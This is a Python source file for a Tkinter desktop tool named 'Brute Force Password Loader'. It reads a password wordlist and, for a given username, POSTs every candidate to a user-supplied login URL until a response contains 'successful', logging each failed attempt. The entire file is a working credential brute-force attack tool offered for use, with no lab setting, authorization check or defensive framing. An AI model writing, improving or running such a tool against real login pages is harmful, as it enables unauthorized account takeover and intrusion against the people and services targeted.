import tkinter as tk
from tkinter import filedialog, messagebox
from PIL import Image, ImageTk
import threading
import requests

class BruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Password Loader")
        self.root.geometry("1280x720")
        self.root.configure(bg='black')

        # Load and set background image, but not full screen
        self.background_image = Image.open("ui.jpg")
        self.background_image = self.background_image.resize((1280, 720), Image.LANCZOS)
        self.bg_img = ImageTk.PhotoImage(self.background_image)
        self.background_label = tk.Label(self.root, image=self.bg_img)
        self.background_label.place(x=0, y=0, relwidth=1, relheight=1)

        # Create UI elements with adjusted sizes and colors
        self.create_widgets()

    def create_widgets(self):
        # Adding a title with white text
        tk.Label(self.root, text="Brute Force Password Loader", fg='white', bg='#1a1a1a', font=("Helvetica", 16, "bold")).place(x=400, y=20)

        # Labels and entry boxes with matching colors
        tk.Label(self.root, text="Select Password File:", fg='white', bg='#1a1a1a', font=("Helvetica", 12)).place(x=50, y=80)
        self.file_path_entry = tk.Entry(self.root, width=40, bg='#333333', fg='white', insertbackground='white', font=("Helvetica", 10))
        self.file_path_entry.place(x=220, y=80)
        tk.Button(self.root, text="Browse", command=self.load_file, bg='#444444', fg='white', font=("Helvetica", 10)).place(x=580, y=75)

        tk.Label(self.root, text="Enter Username:", fg='white', bg='#1a1a1a', font=("Helvetica", 12)).place(x=50, y=130)
        self.username_entry = tk.Entry(self.root, width=40, bg='#333333', fg='white', insertbackground='white', font=("Helvetica", 10))
        self.username_entry.place(x=220, y=130)

        tk.Label(self.root, text="Enter URL:", fg='white', bg='#1a1a1a', font=("Helvetica", 12)).place(x=50, y=180)
        self.target_path_entry = tk.Entry(self.root, width=40, bg='#333333', fg='white', insertbackground='white', font=("Helvetica", 10))
        self.target_path_entry.place(x=220, y=180)
        tk.Button(self.root, text="Browse/Set URL", command=self.load_target_file, bg='#444444', fg='white', font=("Helvetica", 10)).place(x=580, y=175)

        tk.Button(self.root, text="Start Brute Force", command=self.start_brute_force, bg='#555555', fg='white', font=("Helvetica", 12)).place(x=450, y=230)

        self.status_label = tk.Label(self.root, text="", fg='white', bg='#1a1a1a', font=("Helvetica", 12))
        self.status_label.place(x=50, y=280)

        # Text area for output
        self.text_area = tk.Text(self.root, bg='#333333', fg='white', height=15, width=80, font=("Helvetica", 10))
        self.text_area.place(x=50, y=320)
        self.scrollbar = tk.Scrollbar(self.root, command=self.text_area.yview, bg='#333333')
        self.text_area.config(yscrollcommand=self.scrollbar.set)
        self.scrollbar.place(x=1010, y=320, height=240)

    def load_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if file_path:
            self.file_path_entry.delete(0, tk.END)
            self.file_path_entry.insert(0, file_path)

    def load_target_file(self):
        url = tk.simpledialog.askstring("Input", "Enter URL:")
        if url:
            self.target_path_entry.delete(0, tk.END)
            self.target_path_entry.insert(0, url)

    def start_brute_force(self):
        file_path = self.file_path_entry.get()
        target_url = self.target_path_entry.get()
        username = self.username_entry.get()

        if not file_path:
            messagebox.showerror("Error", "Please select a password file.")
            return

        if not target_url:
            messagebox.showerror("Error", "Please enter a target URL.")
            return

        if not username:
            messagebox.showerror("Error", "Please enter a username.")
            return

        try:
            with open(file_path, 'r') as file:
                passwords = [line.strip() for line in file]

            threading.Thread(target=self.brute_force, args=(target_url, username, passwords)).start()
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    def brute_force(self, target_url, username, passwords):
        for password in passwords:
            try:
                success = self.try_login(target_url, username, password)
                if success:
                    messagebox.showinfo("Success", f'Success! Username: {username}, Password: {password}')
                    return
                else:
                    self.status_label.config(text=f'Failed attempt. Username: {username}, Password: {password}')
                    self.text_area.insert(tk.END, f'Failed attempt. Username: {username}, Password: {password}\n')
                    self.text_area.see(tk.END)
            except Exception as e:
                messagebox.showerror("Error", f"An error occurred: {e}")

        self.status_label.config(text="Brute force attack finished.")

    def try_login(self, url, username, password):
        try:
            response = requests.post(url, data={'username': username, 'password': password})
            if 'successful' in response.text.lower():
                return True
            return False
        except Exception as e:
            print(f"An error occurred: {e}")
            return False


if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.mainloop()